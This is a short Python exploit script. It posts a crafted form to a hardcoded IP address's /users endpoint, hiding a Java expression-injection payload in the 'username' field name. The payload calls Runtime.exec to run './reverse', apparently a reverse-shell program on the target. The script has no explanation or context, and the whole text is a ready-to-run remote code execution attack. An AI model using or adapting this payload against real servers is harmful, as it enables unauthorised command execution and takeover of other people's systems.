import requests

url = "http://140.115.197.136:8081/users"

data = {'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("./reverse")]':'test&password=test&repeatedPassword=test'}
r = requests.post(url,data = data)

print(r)
print(r.text)   